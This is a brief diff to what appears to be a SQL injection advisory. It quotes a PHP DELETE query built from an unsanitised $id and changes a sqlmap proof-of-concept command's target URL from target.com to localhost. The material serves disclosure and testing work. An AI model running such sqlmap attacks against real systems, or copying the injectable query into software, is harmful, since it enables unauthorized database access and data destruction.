@@ -38,7 +38,7 @@ mysql_query("DELETE FROM products WHERE id = '$id'") or die(mysql_error());
 ### POC
 
 ```bash
-sqlmap -u "http://target.com/handgunner-administrator/delete.php" \
+sqlmap -u "http://localhost:8081/handgunner-administrator/delete.php" \
   --data="id=1" \
   --method=POST \
   --batch \
